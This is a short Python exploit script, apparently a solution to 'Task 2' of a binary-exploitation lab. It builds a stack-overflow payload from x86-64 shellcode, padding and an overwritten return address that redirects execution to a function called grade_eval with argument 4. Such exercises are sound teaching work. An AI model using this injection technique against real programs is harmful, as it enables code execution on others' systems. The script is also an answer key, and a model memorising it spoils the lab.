#!/usr/bin/env python3
"""Task 2: run shellcode on the fixed stack and call grade_eval(4)."""
import sys
import struct

EXPR_ADDR  = 0x721000800FD0
GRADE_EVAL = 0x401A87

shellcode  = bytes.fromhex("6a04")         # push $4
shellcode += bytes.fromhex("5f")           # pop %rdi  -> edi = 4
shellcode += bytes.fromhex("4883ec08")     # sub $8,%rsp
shellcode += bytes.fromhex("68871a4000")   # push $0x401a87
shellcode += bytes.fromhex("c3")           # ret
shellcode += b"\x90" * (16 - len(shellcode))

payload  = shellcode
payload += b"A" * 8
payload += struct.pack("<Q", EXPR_ADDR)

sys.stdout.buffer.write(payload)
